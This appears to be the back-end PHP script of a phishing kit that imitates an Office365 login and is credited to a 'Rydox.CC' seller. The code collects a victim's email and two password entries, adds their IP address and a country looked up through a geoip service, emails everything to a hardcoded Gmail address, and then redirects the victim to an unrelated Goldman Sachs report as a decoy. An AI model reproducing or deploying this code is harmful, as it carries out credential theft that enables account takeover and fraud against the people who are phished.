<?php
// Rydox.CC Coding.
// www.rydox.cc
// Telegram : @RydoxTm
// ICQ : @Rydox

$recipient = 'arbenkeci18@gmail.com'; // Put your email address herez
$over = 'https://www.goldmansachs.com/insights/pages/gs-research/us-daily-20-mar-2020/report.pdf';//website
if(isset($_POST['email'])){

function visitor_country()
	{
		
	$ip = getenv("REMOTE_ADDR");
	$result = "Unknown";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	$country = json_decode(curl_exec($ch))->country;
	
	if ($country != null)
		{
		$result = $country;
		}

	return $result;
	}

	$email = $_POST['email'];
$pass = $_POST['pass1'];
$pass2 = $_POST['pass2'];
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");

	$ip = getenv("REMOTE_ADDR");
	
    $message.= "User Email: " . $email . "\n";
    $message.= "User Password 1: " . $pass . "\n";
    $message.= "User Password 2: " . $pass2 . "\n";
	$message.= "Client IP      : $ip\n";
	$message.= "Client Country      : $country\n";
	$subject = "Office365 | True Login: " . $ip . "\n";

	if (mail($recipient, $subject, $message))
		{
			header("Location: $over");
		}
	  else
		{
		header("Location: $over?error&id=$pass&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1");
		
		}
	}else{
        header("Location: index3.php");
	}
